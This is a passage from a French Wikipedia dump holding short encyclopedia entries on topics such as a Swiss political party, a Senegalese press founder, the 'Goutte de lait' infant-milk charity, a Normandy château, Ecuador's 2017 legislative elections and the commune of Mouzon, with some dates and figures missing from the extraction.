BastA! a été fondé en 1995 avant tout par d'anciens membres des Organisations progressistes de Suisse. BastAǃ est membre des Verts suisses. En compagnie des Verts de Bâle-Ville, également membre des Verts suisses, BastAǃ a pris part aux récentes élections sous le nom de (alliance verte).
L'alliance verte compte 13 représentants au Grand Conseil dont 5 sont membres de BastAǃ. Sibel Arslan (BastAǃ) a été élue au Conseil national en 2015.

</doc>
<doc id="10579580" url="https://fr.wikipedia.org/wiki?curid=10579580" title="Leo Au">
Leo Au

Leo Au (), né le à Hong Kong, est un joueur professionnel de squash représentant Hong Kong. Il atteint, en juillet 2018, la mondiale sur le circuit international, son meilleur classement. Il est le frère de la joueuse de squash professionnelle Annie Au. En mai 2015, il devient champion d'Asie en battant Abdullah Al Muzayen en finale. Il prend sa retraite sportive en mai 2020.
Biographie.
Le , il dispute et remporte le plus long match de squash de l'histoire en battant Shawn Delierre 11-6, 4-11, 11-6, 7-11, 16-14 en 170 minutes. Il efface à cette occasion le précédent record établi par le légendaire Jahangir Khan qui avait battu en 1985 Gamal Awad lors d'un match qui avait duré 166 minutes.

</doc>
<doc id="10579586" url="https://fr.wikipedia.org/wiki?curid=10579586" title="Gian-Reto Plattner">
Gian-Reto Plattner

Gian-Reto Placidus Plattner, né le à Zurich et mort le à Bâle, est un physicien et une personnalité politique suisse, membre du parti socialiste.
Biographie.
Fils du chimiste A. Placidus Plattner, Gian-Reto Plattner a étudié la physique à l'Université de Bâle. En 1984, il y est devenu professeur agrégé de physique expérimentale, puis vice-chancelier de la recherche de 2000 à sa retraite en 2005.
Entre 1982 et 1991, il a siégé au conseil communal de Riehen et l'a présidé entre 1988 et 1990. De 1984 à 1992, il a été membre du Grand Conseil du canton de Bâle-Ville, y présidant le groupe socialiste entre 1988 et 1992. Il a représenté de 1991 à 2003 le canton de Bâle-Ville au Conseil des États qu'il a présidé 2002/2003.

</doc>
<doc id="10579592" url="https://fr.wikipedia.org/wiki?curid=10579592" title="Sidy Lamine Niasse">
Sidy Lamine Niasse

Sidy Lamine Niasse, né le à Kaolack et mort le à Dakar, est un homme public sénégalais. Juriste, enseignant, journaliste et guide religieux, il est le fondateur et le président-directeur général du groupe de presse sénégalais Wal fadjri. 
Biographie.
Famille.
Sidi Lamine Niass est né le à Kaolack.
Fils du grand savant, écrivain et homme de Dieu, Muhammad Al Khalifa Niasse (1881-1959), il est issu d’une des familles maraboutiques les plus connues du Sénégal et de l’Afrique. Sa mère, la chérif Amina Bint Barham, est de la grande tribu des Idaw Ali de Mauritanie, descendants du prophète Mahomet.
Petit-fils d’Elhadji Abdoulaye Niasse, fondateur de la branche niassène de la Tariqa Tijaniyya, Sidi Lamine Niass s’est beaucoup investi pour l’unification de la grande famille niassène. Entretenant les meilleures relations avec l’ensemble des guides religieux du Sénégal et n’accordant pas une grande différence entre sunnites, chiites et soufis, Sidi Lamine Niass a également beaucoup œuvré pour l’entente entre les confréries à travers des actes concrets et remarquables. Au lendemain de la cérémonie de dédicace des œuvres de Khalifa El Hadj Mohamad Niass, organisée par Sidi Lamine, le quotidien sénégalais "Rewmi" notait : « Le patriotisme de Sidy Lamine est son impressionnant esprit d’ouverture dont la seule explication est sa connaissance atavique et capillaire de l’Être humain. Les personnalités religieuses choisies pour être les Parrains relèvent d’obédience confrérique différente, mais ne croient qu’à un seul Allah, appartiennent à une seule religion, ne suivent que la tradition du Prophète et n’appartiennent qu’à une seule religion, l’Islam. Sidy Lamine a réussi à illustrer l’unité nationale en la consolidant par une mobilisation autour de la Sagesse, seul acquis humain qui fait l’Homme ».
Carrière.
Sidi Lamine Niass commence sa carrière professionnelle par l’enseignement. De 1971 à 1975, très jeune, il est enseignant en arabe. Il était alors comme fasciné par ce qu’a été l’engagement des enseignants durant la crise de 1968. Après cette première expérience dans les salles de classe, il part en Égypte, où il étudie le Droit et la Jurisprudence Islamique à l'université Al-Azhar du Caire. « Comme beaucoup de jeunes d’origine maraboutique de sa génération, il a voulu élargir son horizon intellectuel et sa connaissance du monde islamique au sein duquel les débats d’idées tournaient non seulement autour des questions de la foi et du rituel, mais aussi autour des problèmes politiques et sociaux, et de la place de l’Islam dans un monde dominé de plus en plus par un matérialisme souvent destructeur des valeurs spirituelles, sociales et humaines ». Revenu au Sénégal, au début des années 1980, Sidi Lamine Niass est préoccupé par la condition du marabout et de l’arabisant. Étudiant engagé, il a été le président de l’Association des étudiants sénégalais en Égypte, il ne reste pas inactif à son retour au Sénégal. Sidi Lamine Niass s’engage pour la réhabilitation de la langue arabe dans son pays où le français règne sans partage au sein de l’administration.
C’est cet engagement qui amène Sidi Lamine Niass à se lancer dans la presse. En , il crée le bimensuel "Wal fadjri" (mots arabes signifiant l’Aurore) qui devient hebdomadaire en . Au mois , le journal devient semi-quotidien paraissant trois fois par semaine. À partir de , il parait quotidiennement. Sidi Lamine Niass ne voulut pas s’arrêter en si bon chemin. En , il obtient une bande FM (Walf Fm). Et progressivement, il mit en place le premier groupe de presse de l’Afrique de l’Ouest composé d’un quotidien ("Walf Quotidien"), d’une radio (Walf Fm), d’une télévision (Walf Tv) et d’un site internet. Un groupe de presse qui fait de Sidi Lamine Niass l’un des hommes les plus influents du Sénégal.
Un idéologue constant.
Sidi Lamine Niass a passé ses premières nuits en prison sous le magistère de Léopold Sédar Senghor (de à ). Ses idées souvent aux antipodes de la bienséance préconisée par le premier président du Sénégal indépendant, Sidi Lamine est perçu comme un rebelle, bien aidé en cela par son frère qui multiplie les actions contre la France pour plaire à Mouammar Kadhafi et obtenir ses financements. Sidi Lamine Niass paie ainsi les pots cassés par son frère qui ira même jusqu’à brûler le drapeau français.
Conseiller officieux du président Abdou Diouf, Sidi Lamine Niass a beaucoup participé à raffermir les relations entre le Sénégal et les pays arabes, notamment du Golfe. Le premier sommet de l’Organisation de la coopération islamique (OCI), accueilli par le Sénégal, en 1991, fait partie d’une de ses plus concluantes missions dans cette partie du monde. En , il est fait Chevalier de l’ordre du Mérite sénégalais. Avec l’arrivée d’Abdoulaye Wade au pouvoir, ses relations avec le chef de l’État sont en dents de scie. Le , les locaux du groupe Wal Fadjri sont mis à sac. Le Syndicat des professionnels de l’information et de la communication du Sénégal (Synpics), dénonce « une attaque barbare (…) qui a causé des blessures à des membres du personnel (de Walfadjri) ainsi que de graves dégâts matériels ». Un ministre de la République reconnait la responsabilité de l’État dans le saccage qui est perpétré par les disciples d’un marabout bien connu au Sénégal. C’est Abdoulaye Wade, lui-même, qui inaugure, le , le tout nouveau siège du groupe Wal fadjri. Le , Sidi Lamine Niass appelle à manifester contre son régime, à la mythique place de l'Indépendance. Pourtant, comme avec le président Abdou Diouf, le PDG de Wal Fadjiri a grandement contribué au rayonnement de la diplomatie sénégalaise, en s’attachant à lever les difficultés qui ne manquaient pas durant le magistère de Abdoulaye Wade. C’est lui qui a facilité le dialogue avec l’Iran autour du nucléaire et a permis à Abdoulaye Wade d’aider à la pacification des relations entre ce pays et l’Occident.
Avec le président Macky Sall, le PDG de Wal Fadjri reste fidèle à ses principes de « contrepouvoir » qui n’est pas « contre le pouvoir ». Depuis qu’il est à la tête de l’État du Sénégal, Macky Sall l’a reçu plus d’une fois. Pourtant, au mois de , quand le président Sall a voulu modifier la Constitution pour rallonger son mandat, Sidi Lamine Niass s’y est opposé et a publiquement demandé à voter « Non » au référendum.
Entre le président Macky Sall et son prédécesseur, Sidi Lamine Niass a joué les bons offices et a permis, à plusieurs reprises, la conciliation de deux positions antagoniques. Lors du dernier sommet de la Francophonie, accueilli par le Sénégal, au mois de , Abdoulaye Wade voulut organiser une manifestation. Le régime en place s’y opposa et mit sur la table des raisons de sécurité. C’est Sidi Lamine Niass, en tant que médiateur, qui a poussé l’ancien président du Sénégal à reconsidérer sa position et son successeur à permettre aux opposants d’organiser leur manifestation.

</doc>
<doc id="10579595" url="https://fr.wikipedia.org/wiki?curid=10579595" title="La Goutte de lait">
La Goutte de lait

La Goutte de lait désigne une organisation destinée à distribuer du lait stérilisé aux mères qui ne peuvent pas allaiter leur enfant, à dispenser une consultation des nourrissons et à proposer une éducation maternelle en puériculture et hygiène. Elle a été créée dans la commune française de Fécamp en 1894, à l'initiative du docteur Léon Dufour.
Historique.
La société protectrice de l'enfance, par son président Théophile Roussel, fait voter le la loi de protection de l'enfance (dite « loi Roussel »). Cette dernière impose le contrôle des sociétés de charité maternelle et réglemente le fonctionnement des crèches publiques, et privées. Pierre-Constant Budin créé à l'hôpital de la Charité de Paris la consultation des nourrissons.
Première création et développement du réseau des œuvres.
La mortalité infantile est trop importante, et devient, pour nombre de médecins une priorité.
La première "Goutte de lait" est fondée historiquement en 1894, à Fécamp, par le docteur Léon Dufour (1856-1928). 
En cette même année 1894, l"association de bienfaisance du dispensaire de Belleville" fondée en 1892 à Paris () sous l'impulsion du docteur Gaston Variot (1855-1930) et dont les préoccupations sont similaires, adhère à l'idée et adopte le complément de nom "La Goutte de lait". Son dispensaire, inauguré en 1892 au 126, boulevard de Belleville, également renommé, a pour but d'accueillir les familles pauvres de Belleville et de leur offrir, en faveur de leurs nourrissons et jeunes enfants de moins de deux ans, des services entièrement gratuits tels que conseils aux mères, consultations pédiatriques régulières, remise de médicaments prescrites et fourniture de lait stérilisé gratuite (ou à prix réduit) si la mère ne peut pas allaiter. L'œuvre est financée par des initiatives privées. Depuis sa fondation, elle est placée sous le haut patronage de personnalités influentes. L'établissement est reconnu d'utilité publique en 1909.
Dès avant le tournant du siècle, des villes normandes suivent l'exemple de la Goutte de Lait de Fécamp. À partir du , de nombreuses autres villes françaises s'inspirent des œuvres déjà mises en place. Celles qui suivent sont mentionnées à titre d'exemple.
Le peintre Jean Geoffroy immortalise "La consultation - La Goutte de Lait de Belleville" en 1901 et réalise un triptyque en 1903 : "L’œuvre de la Goutte-de-Lait".
À la veille de la Première Guerre mondiale, près de ont déjà ouvert leurs portes et l'action du docteur Dufour est reconnue et distinguée puisque ce dernier est élevé au grade de chevalier de la Légion d'honneur le .
Les résultats de l'action de la Goutte de lait sur la mortalité infantile - en particulier due aux affections du tube digestif ou par gastro-entérite - sont réels et significatifs.
De nombreuses actions ayant pour but la récolte d'argent sont réalisés chaque année. Ainsi des kermesses ou appel au don sensibilisent la population locale sur l'utilité et la nécessité de cette institution. Une réplique célèbre de Marilyn Monroe dans le film "Certains l'aiment chaud" (1959) se réfère à son action pour la Goutte de lait.
Progressivement, l'aide sera apportée à la mère pendant la grossesse, pendant et après l'accouchement, et l'enfant sera suivi pendant les deux premières années de sa vie.
Mondialisation.
Plusieurs "Congrès international des Gouttes de Lait" se tinrent : le en 1905 à Paris, le à Bruxelles en 1907, le à Berlin en 1911 (III Internationalen Kongress für Säuglingsschutz-Goutte de Lait)…
Fort du succès national, l'institution s'est exportée au Maghreb (à Casablanca, à Alger…), comme en Belgique (à Leval-Trahegnies…) également au Québec au début des années 1900 où ces endroits étaient désignés "les dispensaires de la Goutte de lait". Plusieurs Canadiens-français ont contribué au développement de ces cliniques dont entre autres Séverin Lachapelle, Irma LeVasseur, Georges-Marie LePailleur, curé à l'église Nativité-de-la-Sainte-Vierge-d'Hochelaga; ce dernier avait voyagé en France, avait étudier et travaillé avec le docteur Variot à Belleville. À son retour au Québec en 1910, avec l'aide de médecins hygiénistes, Il avait ouvert un dispensaire permanent dans sa paroisse dans la crypte de l’église. Des médecins hygiénistes venait à l'occasion donner des conférences devant 600 ou 700 femmes. Plus tard, ces cliniques étaient dispersées à plusieurs endroits, au Centre hospitalier universitaire Sainte-Justine et plus tard dans de nombreuses paroisses afin de rejoindre le plus de familles possibles. À Québec, l'organisation portait le nom de l"'Association Québécoise de la Goutte de Lait". Le dispensaire pour l'assistance maternelle est « La Goutte de lait » à Trois-Rivières, ouvert en mai 1923.
De la dissolution à nos jours.
Les dissolutions s'étalent dans le temps selon les nécessités réelles de chaque municipalité : Roubaix en 1959 (créée en 1904), Beaune en 1979 (créée en 1923) ou Nice en 1998 (créée en 1904).
De nos jours, si l'institution n'existe plus, les structures d'accueil se sont reconverties et l'on retrouve ainsi des crèches, des centres de PMI, des centres d'information familiale, ou autres cabinets de soin comme à Roubaix, Vernon ou Meurchin.
Dénomination de l'organisation.
Dans les derniers vers de l’œuvre d'Alfred de Musset, "Sur la naissance du comte de Paris", on y retrouve : 

</doc>
<doc id="10579599" url="https://fr.wikipedia.org/wiki?curid=10579599" title="Je suis moi">
Je suis moi

Je suis moi est le quatrième album studio de Pierre Rapsat, sorti en 1977 chez RCA.
L'après Eurovision.
Alors que la fin de décennie des années 1970 approche, Pierre Rapsat est un jeune auteur-interprète belge peinant à percer. Ses premiers disques, "New York" paru en 1973 et "Musicolor" (1975), ne rencontrent pas d'écho. Ils sont publiés en anglais et français, chose que l'artiste ne fera plus ensuite.
C'est alors que la RTB le sollicite pour représenter le pays à l'Eurovision lors de l'édition de 1976 qui se déroule à La Haye (Pays-Bas). "Judy et Cie", extrait de l'album éponyme, est le morceau retenu. Le chanteur se classe huitiième, ce qui lui assure une certaine notoriété nationale.
Titres (sortie originale).
Titres de la version originale.
La quasi-totalité des titres est coécrite avec Eric Van Hulse. L'album fait l'objet d'une réédition en 1996, complétée de morceaux enregistrés en public.
Premiers véritables succès.
Dans la foulée de l'Eurovision, Pierre Rapsat confirme ses possibilités. "Je suis moi", premier disque signé chez son nouveau label RCA, contient des classiques de son répertoire : le morceau titre est une réflexion désabusée, mais néanmoins lucide, sur la voie qu'il a choisie (la vie d'artiste). "L'Enfant du " relate elle, l'histoire d'un enfant vivant dans un grand ensemble froid et impersonnel, vision futuriste de la ville. C'est l'interprétation d'une composition, réalisée avec la française Jeanne-Marie Sens quelques années auparavant.

</doc>
<doc id="10579607" url="https://fr.wikipedia.org/wiki?curid=10579607" title="Gump Worsley">
Gump Worsley



</doc>
<doc id="10579612" url="https://fr.wikipedia.org/wiki?curid=10579612" title="Château de Préaux-Saint-Sébastien">
Château de Préaux-Saint-Sébastien

Le château de Préaux-Saint-Sébastien est une demeure des , qui se dresse sur le territoire de l'ancienne commune française de Préaux-Saint-Sébastien dans le département du Calvados, en région Normandie.
Localisation.
Le château est situé en face de l’église Saint-Sébastien de Préaux-Saint-Sébastien au sein de la commune nouvelle de Livarot-Pays-d'Auge dans le département français du Calvados.
Historique.
Le château occupe le site d'un ancien château fort. Le fief, qui s'étendait sur Préaux et en partie sur le territoire de Meulles, était un demi-fief de haubert, relevant de la Lande, à Cerqueux et était tenu par . Le seigneur de préaux nommait à la cure.
Son plus ancien seigneur connu est un prêtre, Osbert Halbout, qui vivait au début du . À la fin du le fief est la possession de la famille de Saint-Aubin qui en sera dépossédé temporairement en 1412 pendant l'occupation anglaise lors de la seconde phase de la guerre de Cent Ans. À la fin du , celui-ci échoit à la famille Baudouin. C'est à Gaston Baudouin, seigneur de Préaux, de La Chapelle-Gautier et du Fay, que l'on doit la construction du château, dont il subsiste des parties du .
À la fin du , le château passe à la famille de Moges à la suite du mariage en 1595 de Marie Baudouin avec Scipion de Moges, dont la famille le conservera jusqu'en 1730, année où il échoit à Charles Lebas. On trouve ensuite la famille d'Hommey (1802), puis Triboul (1844).
Le château actuel date des : le corps de logis date du règne de . Arcisse de Caumont évoque le pour les tourelles. D’autres sources évoquent pour les tours cylindriques une construction au .
Arcisse de Caumont évoque un ancien statut de prieuré pour l’édifice, du fait du nom local « la Moinerie » donnée par les habitants aux lieux.
Description.
Le château fut édifié à deux époques différentes. Le corps de logis, de plan rectangulaire, d'un étage sur rez-de-chaussée, date du , et les deux tours qui flanquent le pignon nord sont du .
Arcisse de Caumont indique que les bâtiments du corps de logis sont en pierre et pourvus d’un fronton et de deux tourelles d'angle au nord. Le même note des barreaux de fenêtres des tourelles dignes d’intérêt.
La façade est du corps de logis présente en son centre un avant-corps, d'une largeur de trois fenêtres, en léger saillie, surmonté d'un fronton triangulaire, avec au milieu la porte d'entrée. De chaque côté de celui-ci, la façade est percée de deux baies à chaque niveau. À noter que toutes les ouvertures sont parfaitement alignées. Un bandeau mouluré le long de la façade sépare les deux niveaux surmontés par une corniche également moulurée qui courre sous le toit. La façade ouest reprend a peu-près les mêmes dispositions.
Les tours cylindrique sont quant à elles percées de fenêtres accostées de nervures prismatiques, et arborent à leurs bases et à l'étage un bandeau de pierre. Elles sont couvertes par un toit en poivrière, sous une corniche, et surmontées d'un épi de faîtage vernissé. Elles ont été reliées ultérieurement par une construction basse en brique qui prend appui sur le pignon du , bien que des passages avaient été aménagés entre celles-ci et le corps de logis.
L’édifice est pourvu également de belles cheminées de briques.
Le colombier cylindrique, de presque de diamètre, situé devant le château, a des murs appareillés avec une alternance de lits de brique Saint-Jean de couleur rose saumon, et de pierre calcaire, qui sont interrompus, à partir du troisième lit, par des pilastres plats verticaux. On accède au colombier par une porte orientée du côté du château. Elle est surmontée d'un linteau massif dont les sculptures ont été arasées.
Protection.
Le château est inscrit au titre des monuments historiques par arrêté du .

</doc>
<doc id="10579613" url="https://fr.wikipedia.org/wiki?curid=10579613" title="Élections législatives équatoriennes de 2017">
Élections législatives équatoriennes de 2017

Les élections législatives équatoriennes de 2017 se tiennent le pour élire les de l'Assemblée nationale et les cinq représentants au Parlement andin.
Contexte.
Les élections législatives de 2017 interviennent le même jour que le premier tour de l'élection présidentielle. Rafael Correa, président de la République depuis 2006, ne brigue pas de troisième mandat consécutif, conformément à la Constitution, et soutient Lenín Moreno, ancien vice-président et candidat investi par son mouvement Alianza País (AP) pour lui succéder. Les principales forces politiques en présence outre AP sont l'alliance mouvement CREO-, soutenant la candidature présidentielle de Guillermo Lasso et des candidatures législatives communes dans toutes les provinces, et le Parti social-chrétien avec la candidature présidentielle de Cynthia Viteri. L'enjeu de ces élections est le maintien ou non de la prééminence d'AP à l'Assemblée Nationale, AP ayant obtenu lors des élections générales de 2013 une très large majorité de sur 137.
Système électoral.
L'Assemblée nationale () est un parlement unicaméral composé de pourvus pour quatre ans selon un mode de scrutin mixte principalement proportionnel.
Sur ce total, sont pourvus au scrutin proportionnel plurinominal avec listes ouvertes dans 31 circonscriptions de deux à six sièges appelés districts. Chacune des 24 provinces correspond à un district à l'exception des trois plus peuplées , qui sont subdivisées en plusieurs districts : quatre pour les provinces du Guayas et du Pichincha, deux pour la province du Manabí. Le nombre de sièges par province varie ainsi entre deux pour les provinces les moins peuplées et 20 pour la Province du Guayas. Après décompte des suffrages, les sièges sont répartis à la proportionnelle dans chaque district selon la méthode d'Hondt.
À ces sièges s'ajoutent 15 autres également pourvus au scrutin proportionnel plurinominal dans une unique circonscription nationale, répartis selon la méthode de Sainte-Laguë.
Enfin, six sièges réservés à la diaspora des équatoriens vivant à l'étranger sont pourvus dans trois circonscriptions de deux sièges chacune au scrutin majoritaire plurinominal. Les électeurs disposent de deux voix qu'ils attribuent à raison d'une voix par candidats. Après décompte des suffrages, les deux candidats arrivés en tête dans chaque circonscription sont élus.
Les listes doivent obligatoirement alterner entre candidats de chaque sexe. Les députés sont par ailleurs limités à un maximum de deux mandats, consécutifs ou non.L'âge minimum ouvrant le droit de vote est de , et le vote est obligatoire de .

</doc>
<doc id="10579617" url="https://fr.wikipedia.org/wiki?curid=10579617" title="Mosquée Sidi Ameur">
Mosquée Sidi Ameur

La mosquée Sidi Ameur (), dite aussi petite mosquée de Sidi Ameur, est une mosquée tunisienne située au sud-est de la médina de Tunis ainsi qu'un monument classé depuis le .
Localisation.
Elle se trouve au numéro 24 de la rue Sidi Ali Azzouz.
Étymologie.
Elle tire son nom du saint homme Sidi Ameur El Batach, originaire de La Marsa et mort dans la nuit du 21 Joumada al oula de l'année 933 de l'hégire.
Histoire.
Dès son enterrement dans cette mosquée en 1526, des personnes commencent à visiter cet édifice et à collecter les qualités de Sidi Ameur dans un ouvrage.

</doc>
<doc id="10579636" url="https://fr.wikipedia.org/wiki?curid=10579636" title="Moses Lake (Washington)">
Moses Lake (Washington)



</doc>
<doc id="10579667" url="https://fr.wikipedia.org/wiki?curid=10579667" title="Pseudo-sciences.org">
Pseudo-sciences.org



</doc>
<doc id="10579720" url="https://fr.wikipedia.org/wiki?curid=10579720" title="Championnats d'Europe de triathlon 1997">
Championnats d'Europe de triathlon 1997

Les championnats d'Europe de triathlon 1997 sont la treizième édition des championnats d'Europe de triathlon, une compétition internationale de triathlon sous l'égide de la fédération européenne de ce sport. L'épreuve est constituée de 1 500 mètres de natation, 40 kilomètres de vélo puis 10 kilomètres de course à pied.
Cette édition se tient dans la ville finlandaise de Vuokatti et elle est remportée par le britannique Spencer Smith chez les hommes et par la suissesse Natascha Badmann chez les femmes.
Notes et références.
ITU European Championship 1997 Vuokatti

</doc>
<doc id="10579722" url="https://fr.wikipedia.org/wiki?curid=10579722" title="Manduca andicola">
Manduca andicola

Manduca andicola est une espèce de lépidoptères (papillons) de nuit de la famille des Sphingidae, de la sous-famille des Sphinginae et de la tribu des Sphingini.
Description.
L'espèce est très similaire à "Manduca lefeburii", "Manduca incisa" et "Manduca jasminearum" ; elle en diffère par une face dorsale de l'aile antérieure relativement uniforme avec une remarquable bande sombre diffuse qui va à mi-chemin le long de la costa à la marge extérieure en incorporant la tache discale.
Biologie.
Il existe trois générations d'imagos dans la zone subéquatoriale, avec des adultes qui volent de décembre à janvier, mai à juin et en octobre.

</doc>
<doc id="10579730" url="https://fr.wikipedia.org/wiki?curid=10579730" title="Protoparce andicola">
Protoparce andicola



</doc>
<doc id="10579738" url="https://fr.wikipedia.org/wiki?curid=10579738" title="Décès en 1258">
Décès en 1258

Cette page dresse une liste de personnalités mortes au cours de l'année 1258 :

</doc>
<doc id="10579740" url="https://fr.wikipedia.org/wiki?curid=10579740" title="District d'Angoche">
District d'Angoche

Le est une subdivision administrative de la province de Nampula au nord du Mozambique. En 2007, sa population est de .

</doc>
<doc id="10579746" url="https://fr.wikipedia.org/wiki?curid=10579746" title="Johann Christian Günther">
Johann Christian Günther

Johann Christian Günther ( – ) est un poète allemand originaire de Striegau, en Basse-Silésie. Après avoir fréquenté le gymnase à Schweidnitz, il est envoyé en 1715 par son père, médecin de campagne, pour étudier la médecine à Wittenberg ; mais il est paresseux et dissipé, n'ayant aucun goût pour cette profession, et rompt complètement avec sa famille. En 1717, il se rend à Leipzig, où il est recueilli par Johann Burkhard Mencke (1674-1732), qui a reconnu son génie ; là, il publie un poème sur la paix de Passarowitz (conclu entre l'empereur d'Allemagne et de la Porte en 1718) qui lui fait acquérir une certaine renommée. Une recommandation de Mencke à Frédéric-Auguste II de Saxe, roi de Pologne, s'avère être une erreur, puisque le poète arrive saoul. À partir de ce moment, il mène une vie incertaine, s'enfonçant toujours plus profondément dans le bourbier de la misère, jusqu'à sa mort à Iéna le , à 27 ans. Goethe estime que Günther a été un poète dans le sens le plus complet du terme. L'ensemble de ses poèmes témoigne d'une vive et profonde sensibilité, de beaucoup d'imagination, d'une certaine présence d'esprit et d'une vraie oreille pour la mélodie et le rythme ; néanmoins, un certain cynisme est présent dans la plupart d'entre eux, ainsi que des mots d'esprit insipides ou grossiers.

</doc>
<doc id="10579748" url="https://fr.wikipedia.org/wiki?curid=10579748" title="Museum für Gegenwart">
Museum für Gegenwart



</doc>
<doc id="10579750" url="https://fr.wikipedia.org/wiki?curid=10579750" title="Ocrélizumab">
Ocrélizumab

L'ocrélizumab est un anticorps monoclonal humanisé ciblant la protéine CD20 située sur la surface des lymphocytes B. Il est notamment utilisé comme traitement contre la sclérose en plaques.
Efficacité.
Il entraîne, en association avec le méthotrexate, une amélioration des symptômes de la polyarthrite rhumatoïde.
Dans la sclérose en plaques en rechute, il ralentit la progression de la maladie mieux que l'interféron bêta 1a. Dans sa forme progressive, il ralentit la progression de la maladie, tant au niveau clinique qu'à l'imagerie par IRM.

</doc>
<doc id="10579753" url="https://fr.wikipedia.org/wiki?curid=10579753" title="District d'Eráti">
District d'Eráti

Le est une subdivision administrative de la province de Nampula au nord du Mozambique. En 2007, sa population est de .

</doc>
<doc id="10579755" url="https://fr.wikipedia.org/wiki?curid=10579755" title="Prothèses phonatoires">
Prothèses phonatoires



</doc>
<doc id="10579765" url="https://fr.wikipedia.org/wiki?curid=10579765" title="Naissance en 1259">
Naissance en 1259

Cette page dresse une liste de personnalités nées au cours de l'année 1259 :

</doc>
<doc id="10579771" url="https://fr.wikipedia.org/wiki?curid=10579771" title="Siegfried Bauer">
Siegfried Bauer

Siegfried Bauer, né le à Gerersdorf-Sulz est un triathlète autrichien, champion du monde en 2004 et en 2005 de triathlon d'hiver et double champion d'Autriche de duathlon. Il pratique également le cyclisme sur route et le VTT.
Palmarès en triathlon.
Le tableau présente les résultats les plus significatifs (podium) obtenus sur le circuit national et international de triathlon d'hiver depuis 2004.

</doc>
<doc id="10579805" url="https://fr.wikipedia.org/wiki?curid=10579805" title="Hôtel Saint-Paul (Paris)">
Hôtel Saint-Paul (Paris)



</doc>
<doc id="10579813" url="https://fr.wikipedia.org/wiki?curid=10579813" title="District de Lalaua">
District de Lalaua

Le est une subdivision administrative de la province de Nampula au nord du Mozambique. En 2007, sa population est de .

</doc>
<doc id="10579816" url="https://fr.wikipedia.org/wiki?curid=10579816" title="District de Malema">
District de Malema

Le est une subdivision administrative de la province de Nampula au nord du Mozambique. En 2007, sa population est de .

</doc>
<doc id="10579827" url="https://fr.wikipedia.org/wiki?curid=10579827" title="District de Meconta">
District de Meconta

Le est une subdivision administrative de la province de Nampula au nord du Mozambique. En 2007, sa population est de .

</doc>
<doc id="10579834" url="https://fr.wikipedia.org/wiki?curid=10579834" title="China export">
China export



</doc>
<doc id="10579838" url="https://fr.wikipedia.org/wiki?curid=10579838" title="Los Angeles Time">
Los Angeles Time



</doc>
<doc id="10579840" url="https://fr.wikipedia.org/wiki?curid=10579840" title="Made in China">
Made in China

L'expression made in China signifie "fabriqué en Chine" et peut faire référence aux produits fabriqués en Chine.

</doc>
<doc id="10579844" url="https://fr.wikipedia.org/wiki?curid=10579844" title="District de Mecubúri">
District de Mecubúri

Le est une subdivision administrative de la province de Nampula au nord du Mozambique. En 2007, sa population est de .

</doc>
<doc id="10579851" url="https://fr.wikipedia.org/wiki?curid=10579851" title="Fabriqué en RPC">
Fabriqué en RPC



</doc>
<doc id="10579869" url="https://fr.wikipedia.org/wiki?curid=10579869" title="Mouzon (Ardennes)">
Mouzon (Ardennes)

Mouzon est une commune nouvelle française située dans le département des Ardennes, en région Grand Est.
Elle est née le à la suite de la fusion de deux communes : Amblimont et l'ancienne commune de Mouzon, ces deux communes prenant alors le statut de commune déléguée.
Géographie.
Situation.
Mouzon est à au sud-est de Sedan.
La commune se situe à la croisée de la Meuse et de l’ancienne voie romaine qui va de Reims à Trèves.
Hydrographie.
La commune est dans le bassin versant de la Meuse au sein du bassin Rhin-Meuse. Elle est drainée par la Meuse, le canal de l'Est Branche-Nord, le ruisseau de Yoncq, le ruisseau de Moulins, le ruisseau de St-Remy, le ruisseau de Brouhan, le ruisseau de la Vignette, le ruisseau des Trois Fontaines, le ruisseau de la Fabrique, le ruisseau du Bas de la Rue et le ruisseau de Lombut.
La Meuse, d'une longueur de , est un fleuve européen qui prend sa source en France, dans la commune du Châtelet-sur-Meuse, à d'altitude, et se jette dans la mer du Nord après un cours long d'approximativement traversant la France, la Belgique et les Pays-Bas. Elle s'écoule du sud vers le nord et traverse la commune sur une longueur d'environ , constituant sur son flanc nord-ouest une limite séparative avec la commune d'Autrecourt-et-Pourron.
Le canal de l'Est Branche-Nord, d'une longueur de , est un chenal et un cours d'eau naturel navigable qui relie Givet à Troussey, où il rejoint le canal de la Marne au Rhin. Il se superpose par endroits, dans la commune, à la Meusesur une longueur d'environ .
Le ruisseau de Yoncq, d'une longueur de , prend sa source dans la commune de Saint-Pierremont et se jette dans la Meuse sur la commune, après avoir traversé .
Climat.
Plusieurs études ont été menées afin de caractériser les types climatiques auxquels est exposé le territoire national. Les zonages obtenus diffèrent selon les méthodes utilisées, la nature et le nombre des paramètres pris en compte, le maillage territorial des données et la période de référence. En 2010, le climat de la commune était ainsi de type climat de montagne, selon une étude du Centre national de la recherche scientifique (CNRS) s'appuyant sur une méthode combinant données climatiques et facteurs de milieu (topographie, occupation des sols, etc.) et des données couvrant la période 1971-2000. En 2020, le climat prédominant est classé Cfb, selon la classification de Köppen-Geiger, pour la période 1988-2017, à savoir un climat tempéré à été frais sans saison sèche. Par ailleurs Météo-France publie en 2020 une nouvelle typologie des climats de la France métropolitaine dans laquelle la commune est exposée à un climat océanique altéré et est dans la région climatique Lorraine, plateau de Langres, Morvan, caractérisée par un hiver rude (), des vents modérés et des brouillards fréquents en automne et hiver. Elle est en outre dans la zone H1b au titre de la réglementation environnementale 2020 des constructions neuves.
Pour la période 1971-2000, la température annuelle moyenne est de , avec une amplitude thermique annuelle de . Le cumul annuel moyen de précipitations est de , avec de précipitations en janvier et en juillet. Pour la période 1991-2020, la température moyenne annuelle observée sur la station météorologique de Météo-France la plus proche, sur la commune de Douzy à à vol d'oiseau, est de et le cumul annuel moyen de précipitations est de . .
Pour afficher une liste d’indicateurs climatiques caractérisant la commune aux horizons 2030, 2050 et 2100 et pouvoir ainsi s'adapter aux changements climatiques, entrer son nom dans Climadiag-commune, un site de Météo-France élaboré à partir des nouvelles projections climatiques de référence DRIAS-2020.
Urbanisme.
Typologie.
Au , Mouzon est catégorisée bourg rural, selon la nouvelle grille communale de densité à définie par l'Insee en 2022.
Elle est située hors unité urbaine et hors attraction des villes.
Toponymie.
Le nom « Mouzon » est d'origine celtique et signifie « le marché de la Meuse » ("Moso magus" en gaulois).
Elle peut être identifiée à "Mosa" sur la table de Peutinger sur la route de Reims à Cologne.
Histoire.
Les informations relatives à l'histoire de Mouzon sont une synthèse des données contenues dans les articles Amblimont et Mouzon (commune déléguée).
